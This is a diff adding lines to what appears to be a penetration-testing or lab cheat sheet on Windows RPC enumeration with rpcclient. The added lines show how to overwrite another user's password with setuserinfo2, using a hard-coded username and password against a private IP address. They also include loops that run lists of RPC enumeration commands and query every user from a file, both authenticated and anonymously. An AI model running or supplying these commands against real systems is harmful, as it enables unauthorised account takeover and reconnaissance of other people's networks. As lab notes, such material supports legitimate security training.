@@ -101,3 +101,23 @@ lsalookupprivvalue SeCreateTokenPrivielge
 
 #Run the below command
 for command in $(cat rpc-enum.txt); do rpcclient -U "%" -c $command $ip; done
+
+
+
+OVERWRITE SOMEONE'S PASSWORD!!!
+```bash
+rpcclient -N -U "hazel.green%haze1988" $ip
+setuserinfo2 MOLLY.SMITH 23 'Password123!'
+```
+
+Automate a bit.
+
+```bash
+for command in $(cat /opt/windows/rpc-enum.txt); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "$command"; done
+for name in $(cat ../users.txt.bak); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "queryuser $name"; done
+```
+
+```bash
+for command in $(cat rpc-enum.txt); do rpcclient $ip -U "%" -c $command; done
+for name in $(cat ../users.txt.bak); do rpcclient $ip -U "%" -c "queryuser $name"; done
+```
